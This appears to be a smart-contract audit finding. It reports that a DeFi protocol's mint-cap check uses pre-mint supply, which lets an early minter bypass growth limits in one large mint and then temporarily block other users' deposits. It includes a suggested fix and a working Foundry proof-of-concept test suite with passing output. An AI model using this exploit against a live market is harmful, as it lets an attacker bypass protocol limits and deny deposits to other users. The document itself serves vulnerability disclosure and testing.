      "body": "## Finding description and impact\n\n`LatentSwapLogic._checkMintCap` gates growth using the **pre-action** `marketBaseTokenSupply`. When the market is “small” (i.e., `marketBaseTokenSupply <= 2^noCapLimit`), the small-market branch permits any `mintAmount <= 2^96` (Q96) even if that amount would make the market “large” right after the action. The cap is **not re-evaluated** against the post-mint supply. `Covenant.mint` calls `LEX.mint(...)` passing `localBaseSupply` (cached pre-state). LEX calls `_checkMintCap` against that value. Only after the LEX call returns does Covenant update `ms.baseSupply`. The same ordering applies to BASE-exact-in swaps that mint under the hood.\n\n\n1. **One-shot large growth bypass.** An attacker starts with a tiny market (≤ `2^noCapLimit`; ≈ ~1 BASE for 18-decimals with `noCapLimit = 60`) and mints **100e18** BASE. This passes the *small-market* branch (≤ 2^96), bypassing what the *large-market* ETWAP growth bound would have rejected.\n2. **Deposit DoS / bricking via ETWAP lag.** Immediately after the oversized mint, subsequent **legitimate small mints** (e.g., 1e18) revert with `E_LEX_MintCapExceeded` because ETWAP still reflects the prior tiny market. Deposits are time-gated until ETWAP catches up, creating a practical DoS on adding collateral.\n\nThis requires no privileged roles, no oracle manipulation, and no governance actions, only being early to mint when the market is small. Consequently, any newly created market with small initial supply is susceptible; early actors can grow supply in one jump and temporarily block others from depositing, impacting market bootstrapping.\n\n\n## Recommended mitigation steps\n\nensure cap enforcement reflects the post-action state (or disallows crossing from small to large in a single unchecked jump).\n\nIf `preSupply <= 2^noCapLimit` and `preSupply + mintAmount > 2^noCapLimit`, re-run the large-market check using the post-mint supply (and current ETWAP). Revert if it would violate `eTWAP << MAX_MINT_FACTOR_CAP` or the per-call growth limit.",
      "proofOfConcept": "```solidity\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity ^0.8.30;\n\nimport \"forge-std/Test.sol\";\n\nimport {ICovenant, MarketId, MarketParams, MarketState, MintParams} from \"../../src/interfaces/ICovenant.sol\";\nimport {Covenant} from \"../../src/Covenant.sol\";\nimport {LatentSwapLEX} from \"../../src/lex/latentswap/LatentSwapLEX.sol\";\nimport {LSErrors} from \"../../src/lex/latentswap/libraries/LSErrors.sol\";\nimport {FixedPoint} from \"../../src/lex/latentswap/libraries/FixedPoint.sol\";\nimport {MockERC20} from \"../mocks/MockERC20.sol\";\nimport {MockOracle} from \"../mocks/MockOracle.sol\";\n\n/// @notice PoC: Pre-state \"small market\" mint-cap check allows a one-shot very large mint that the \"large-market\" branch would reject.\n/// The cap logic (LatentSwapLogic._checkMintCap) checks marketBaseTokenSupply *before* Covenant updates it.\n/// If pre-supply <= 2^noCapLimit (~1 token for 18-decimals with noCapLimit=60), then any mintAmount <= 2^96 passes.\ncontract POC_MintCap_PreState_Bypass is Test {\n    // actors\n    address internal owner = address(this);\n    address internal alice = address(0xA11CE);\n\n    // core components\n    Covenant internal core;\n    LatentSwapLEX internal lex;\n    MockERC20 internal base;\n    MockERC20 internal quote;\n    MockOracle internal oracle;\n\n    // config\n    uint8 internal constant NO_CAP_LIMIT_18DEC = 60; // ~ 2^60 ~= 1.15e18\n    uint256 internal constant MINT_BIG = 100e18;      // << 2^96 so it passes \"small-market\" branch\n    uint8  internal constant SWAP_FEE_BPS = 0;\n    uint32 internal constant DURATION = 30 days;\n\n    // a simple pricing band\n    uint160 internal constant EDGE_HI = uint160(8 * FixedPoint.Q96);              // 8.0\n    uint160 internal constant EDGE_LO = uint160(FixedPoint.Q96 / 32);             // 1/32\n    uint160 internal constant LIM_HIGH = uint160((1050 * FixedPoint.Q96) / 1000); // ~1.05\n    uint160 internal constant LIM_MAX  = uint160((1300 * FixedPoint.Q96) / 1000); // ~1.30\n\n    function setUp() public {\n        // Deploy core + LEX\n        core = new Covenant(owner);\n        lex = new LatentSwapLEX(\n            owner,\n            address(core),\n            EDGE_HI,\n            EDGE_LO,\n            LIM_HIGH,\n            LIM_MAX,\n            0,            // initLnRateBias\n            DURATION,\n            SWAP_FEE_BPS\n        );\n\n        // Enable LEX and a mock curator\n        core.setEnabledLEX(address(lex), true);\n\n        // Tokens & oracle (constructor: (initialOwner, name, symbol, decimals))\n        base = new MockERC20(owner, \"BASE\", \"BASE\", 18);\n        quote = new MockERC20(owner, \"QUOTE\", \"QUOTE\", 18);\n        oracle = new MockOracle(owner);\n        core.setEnabledCurator(address(oracle), true);\n\n        // Set default noCapLimit for BASE to 60 (≈ 1 base token threshold at 18 decimals)\n        lex.setDefaultNoCapLimit(address(base), NO_CAP_LIMIT_18DEC);\n    }\n\n    function _createMarket(address _base, address _quote) internal returns (MarketId marketId, MarketParams memory mp) {\n        mp = MarketParams({\n            baseToken: _base,\n            quoteToken: _quote,\n            curator: address(oracle),\n            lex: address(lex)\n        });\n        marketId = core.createMarket(mp, hex\"\");\n    }\n\n    function _mintThroughCore(\n        address user,\n        MarketId id,\n        MarketParams memory mp_,\n        uint256 amount\n    ) internal returns (uint256 aOut, uint256 zOut) {\n        // fund and approve\n        vm.prank(owner);\n        base.mint(user, amount);\n\n        vm.startPrank(user);\n        base.approve(address(core), type(uint256).max);\n        (aOut, zOut) = core.mint(\n            MintParams({\n                marketId: id,\n                marketParams: mp_,\n                baseAmountIn: amount,\n                to: user,\n                minATokenAmountOut: 0,\n                minZTokenAmountOut: 0,\n                data: \"\",\n                msgValue: 0\n            })\n        );\n        vm.stopPrank();\n    }\n\n    /// Control: in a \"large\" market (pre-supply > 2^noCapLimit), a huge mint reverts.\n    function test_LargeMarket_SameMint_Reverts() public {\n        (MarketId id, MarketParams memory mp) = _createMarket(address(base), address(quote));\n\n        // First, push pre-supply above the \"small\" threshold using a modest mint.\n        // Threshold ~= 2^60 ~= 1.15e18, so mint 2e18 to cross it.\n        _mintThroughCore(alice, id, mp, 2e18);\n\n        // Now attempt the same big mint. Should revert in the large-market branch.\n        vm.startPrank(alice);\n        base.approve(address(core), type(uint256).max);\n        vm.expectRevert(LSErrors.E_LEX_MintCapExceeded.selector);\n        core.mint(\n            MintParams({\n                marketId: id,\n                marketParams: mp,\n                baseAmountIn: MINT_BIG,\n                to: alice,\n                minATokenAmountOut: 0,\n                minZTokenAmountOut: 0,\n                data: \"\",\n                msgValue: 0\n            })\n        );\n        vm.stopPrank();\n    }\n\n    /// PoC: starting from a tiny market (pre-supply <= 2^noCapLimit), an oversized mint passes due to the pre-state check.\n    function test_SmallMarket_Allows_HugeGrowth_PreState_Bypass() public {\n        (MarketId id, MarketParams memory mp) = _createMarket(address(base), address(quote));\n\n        // Starting from pre-supply == 0 (<= threshold), mint a very large amount (100e18).\n        // This would be rejected by the \"large\" branch, but the \"small\" pre-state branch allows it.\n        (uint256 aOut, uint256 zOut) = _mintThroughCore(alice, id, mp, MINT_BIG);\n\n        assertGt(aOut, 0, \"aToken out should be > 0\");\n        assertGt(zOut, 0, \"zToken out should be > 0\");\n\n        // Sanity: base supply grew significantly\n        MarketState memory _ms = core.getMarketState(id);\n        uint256 baseSupply = _ms.baseSupply;\n        assertGt(baseSupply, 50e18, \"baseSupply should have grown massively after one mint\");\n    }\n\n    function test_SmallThenLarge_Followup_Reverts() public {\n    (MarketId id, MarketParams memory mp) = _createMarket(address(base), address(quote));\n\n    // 1) Bypass from small pre-state:\n    _mintThroughCore(alice, id, mp, MINT_BIG);\n\n    // 2) Same action now that the market is large must revert:\n    vm.startPrank(alice);\n    base.approve(address(core), type(uint256).max);\n    vm.expectRevert(LSErrors.E_LEX_MintCapExceeded.selector);\n    core.mint(\n        MintParams({\n            marketId: id,\n            marketParams: mp,\n            baseAmountIn: MINT_BIG,\n            to: alice,\n            minATokenAmountOut: 0,\n            minZTokenAmountOut: 0,\n            data: \"\",\n            msgValue: 0\n        })\n    );\n    vm.stopPrank();\n}\n\n\n/// Impact test: after bypassing the small-market pre-check with a huge mint,\n    /// subsequent legitimate mints are **blocked** by the large-market ETWAP bound\n    /// because ETWAP lags behind. This is a realistic DoS/brick of deposits.\n    function test_Bypass_BricksFurtherMints_UntilETWAPCatchesUp() public {\n        (MarketId id, MarketParams memory mp) = _createMarket(address(base), address(quote));\n\n        // Attacker performs the one-shot large mint while pre-supply is small.\n        _mintThroughCore(alice, id, mp, MINT_BIG);\n\n        // A normal user tries to add a small amount of liquidity right after.\n        address bob = address(0xB0B);\n        vm.prank(owner);\n        base.mint(bob, 1e18);\n\n        vm.startPrank(bob);\n        base.approve(address(core), type(uint256).max);\n        vm.expectRevert(LSErrors.E_LEX_MintCapExceeded.selector);\n        core.mint(\n            MintParams({\n                marketId: id,\n                marketParams: mp,\n                baseAmountIn: 1e18, // tiny, but ETWAP is still near the pre-mint level, so large-branch check fails\n                to: bob,\n                minATokenAmountOut: 0,\n                minZTokenAmountOut: 0,\n                data: \"\",\n                msgValue: 0\n            })\n        );\n        vm.stopPrank();\n    }\n\n}\n```\n\nYou should see the following output\n```ts\nforge test -vv --match-path test/poc/POC_MintCap_PreState_Bypass.t.sol \n[⠒] Compiling...\nNo files changed, compilation skipped\n\nRan 4 tests for test/poc/POC_MintCap_PreState_Bypass.t.sol:POC_MintCap_PreState_Bypass\n[PASS] test_Bypass_BricksFurtherMints_UntilETWAPCatchesUp() (gas: 2008797)\n[PASS] test_LargeMarket_SameMint_Reverts() (gas: 1960594)\n[PASS] test_SmallMarket_Allows_HugeGrowth_PreState_Bypass() (gas: 1932169)\n[PASS] test_SmallThenLarge_Followup_Reverts() (gas: 1960918)\nSuite result: ok. 4 passed; 0 failed; 0 skipped; finished in 4.54ms (7.64ms CPU time)\n\nRan 1 test suite in 19.53ms (4.54ms CPU time): 4 tests passed, 0 failed, 0 skipped (4 total tests)\n```",
